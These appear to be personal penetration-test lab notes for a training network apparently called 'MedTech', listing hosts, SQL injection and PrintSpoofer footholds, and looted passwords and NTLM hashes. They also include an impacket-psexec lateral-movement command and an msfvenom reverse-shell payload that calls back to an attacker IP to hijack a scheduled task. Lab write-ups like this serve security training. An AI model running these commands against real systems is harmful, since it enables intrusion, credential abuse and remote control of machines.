# MedTech

## Domain

### 192.168.190.121 / WEB 2

#### Foothold

sqli at [http://192.168.190.121/login.aspx](http://192.168.190.121/login.aspx)

#### Privesc

printspoofer64

#### Loot

joe:Flowers1

Administrator:b2c03054c306ac8fc5f9d188710b0168



### 172.16.190.14 / NTP

use mario offsec

### 172.16.190.11 / FILES02

User joe can acces throught psexec

```
impacket-psexec medtech/joe:Flowers1@172.16.190.11 -dc-ip 172.16.190.10
```

#### Loot

Administrator:f1014ac49bae005ee3ece5f47547d185

daisy : abf36048c1cf88f5603381c5128feb8e

toad : 5be63a865b65349851c1f11a067a3068

wario : fdf36048c1cf88f5630381c5e38feb8e : Mushroom!

goomba : 8e9e1516818ce4e54247e71e71b5f436

### 172.16.190.83 / CLIENT2

We can login with wario

#### PrivEsc

auditTracker.exe it's used in a task. we can hijack it

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.223 LPORT=4444 -f exe -o auditTracker.exe
```

replace it and then start the task

```
sc.exe start auditTracker
```

#### loot

administrator : 00fd074ec24fd70c76727ee9b2d7aacd

### 172.16.190.82 / CLIENT1

You can login with yoshi : Mushroom!

### 172.16.190.12 / DEV04

you can login with yoshi : Mushroom! using remmina

backup file



